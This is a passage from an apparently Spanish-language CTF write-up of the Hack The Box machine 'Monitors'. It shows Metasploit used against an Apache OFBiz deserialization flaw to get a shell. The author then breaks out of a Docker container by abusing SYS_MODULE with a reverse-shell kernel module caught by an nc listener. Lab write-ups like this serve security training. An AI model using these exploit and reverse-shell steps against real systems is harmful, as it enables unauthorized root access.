++ SSL Info:        Subject:  /C<span style="color:#f92672">=</span>US/ST<span style="color:#f92672">=</span>DE/L<span style="color:#f92672">=</span>Wilmington/O<span style="color:#f92672">=</span>Apache Software Fundation/OU<span style="color:#f92672">=</span>Apache OFBiz/CN<span style="color:#f92672">=</span>ofbiz-vm.apache.org/emailAddress<span style="color:#f92672">=</span>dev@ofbiz.apache.org
+                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
+                   Issuer:   /C<span style="color:#f92672">=</span>US/ST<span style="color:#f92672">=</span>DE/L<span style="color:#f92672">=</span>Wilmington/O<span style="color:#f92672">=</span>Apache Software Fundation/OU<span style="color:#f92672">=</span>Apache OFBiz/CN<span style="color:#f92672">=</span>ofbiz-vm.apache.org/emailAddress<span style="color:#f92672">=</span>dev@ofbiz.apache.org
+...snip...
+</code></pre></div><p>Haciendo uso de metasploit, configuramos las opciones y lanzamos el exploit</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">msf6 exploit<span style="color:#f92672">(</span>linux/http/apache_ofbiz_deserialization<span style="color:#f92672">)</span> &gt; set RHOSTS 127.0.0.1
+msf6 exploit<span style="color:#f92672">(</span>linux/http/apache_ofbiz_deserialization<span style="color:#f92672">)</span> &gt; set LHOST tun0
+msf6 exploit<span style="color:#f92672">(</span>linux/http/apache_ofbiz_deserialization<span style="color:#f92672">)</span> &gt; set LPORT <span style="color:#ae81ff">9002</span>
+msf6 exploit<span style="color:#f92672">(</span>linux/http/apache_ofbiz_deserialization<span style="color:#f92672">)</span> &gt; set ForceExploit true
+msf6 exploit<span style="color:#f92672">(</span>linux/http/apache_ofbiz_deserialization<span style="color:#f92672">)</span> &gt; run
+...snip...
+
+meterpreter &gt; shell
+Process <span style="color:#ae81ff">160</span> created.
+Channel <span style="color:#ae81ff">1</span> created.
+which python
+python/usr/bin/python
+python -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+root@50d6a7353858:/usr/src/apache-ofbiz-17.12.01# id
+uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+</code></pre></div><p>Recordando la nota que encontramos antes en el directorio de <em>marcus</em> podemos saber que estamos en un docker, enumerando docker, podemos ver las <em>capabilities</em>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">root@50d6a7353858:~# capsh --print
+Current: <span style="color:#f92672">=</span> cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip
+Bounding set <span style="color:#f92672">=</span>cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+Securebits: 00/0x0/1<span style="color:#960050;background-color:#1e0010">&#39;</span>b0
+ secure-noroot: no <span style="color:#f92672">(</span>unlocked<span style="color:#f92672">)</span>
+ secure-no-suid-fixup: no <span style="color:#f92672">(</span>unlocked<span style="color:#f92672">)</span>
+ secure-keep-caps: no <span style="color:#f92672">(</span>unlocked<span style="color:#f92672">)</span>
+uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+groups<span style="color:#f92672">=</span>
+</code></pre></div><p>Podemos observar <code>SYS_MODULE</code>. Siguiendo el siguiente <a href="https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd"target="_blank" rel="external nofollow noopener noreferrer">artículo</a>, podemos escapar de un contenedor abusando de <code>SYS_MODULE</code>.</p>
+<p>Este exploit da errores por lo que hay que modificar el <code>$PATH</code> y configurarlo para que funcione correctamente. Una vez solucionados los errores, creamos los archivos necesarios en nuestra máquina, los transferimos y ponemos un puerto a la escucha en la máquina, ejecutamos el módulo de kernel y conseguimos elevar privilegios como <code>root</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">root@50d6a7353858:/# insmod reverse-shell.ko
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">marcus@monitors:~$ nc -lvnp <span style="color:#ae81ff">4444</span>
+Listening on <span style="color:#f92672">[</span>0.0.0.0<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>family 0, port 4443<span style="color:#f92672">)</span>
+Connection from 10.10.10.238 <span style="color:#ae81ff">41902</span> received!
+bash: cannot set terminal process group <span style="color:#f92672">(</span>-1<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+bash: no job control in this shell
+
+root@monitors:/# id
+uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+root@monitors:/# cat /root/root.txt
+a9da7d48445695a**************
+</code></pre></div></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2021-10-11 12:40:00">Updated on 2021-10-11&nbsp;</span>
+      </div><div class="post-info-license">
+          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
+        </div></div>
+    <div class="post-info-line">
+      <div class="post-info-md"></div>
+      <div class="post-info-share">
+        <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="/posts/monitors-htb/monitors-htb/" data-title="Monitors HTB Writeup" data-via="jagelit0" data-hashtags="linux,writeup,hard"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="/posts/monitors-htb/monitors-htb/" data-hashtag="linux"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="/posts/monitors-htb/monitors-htb/" data-title="Monitors HTB Writeup" data-image="../assets/posts/monitors/monitors_card.png"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/linux/' class="post-tag">linux</a><a href='/tags/writeup/' class="post-tag">writeup</a><a href='/tags/hard/' class="post-tag">hard</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/remote-htb/remote-htb/" class="post-nav-item" rel="prev" title="Remote HTB Writeup"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Remote HTB Writeup</a>
+      <a href="/posts/zeno-thm/zeno-thm/" class="post-nav-item" rel="next" title="Zeno THM Writeup">Zeno THM Writeup<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line custom">[rottenbytes]</div><div class="footer-line statistics"></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">Theme FixIt works best with JavaScript enabled.</div>
+  </noscript>
+</div><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":10},"comment":{"enable":false},"data":{"typeit-header-desktop":"\u003e rottenbytes","typeit-header-title-mobile":"\u003e rottenbytes"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"typeit-header-desktop":["typeit-header-desktop"],"typeit-header-title-mobile":["typeit-header-title-mobile"]},"duration":-1,"loop":false,"speed":100}};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
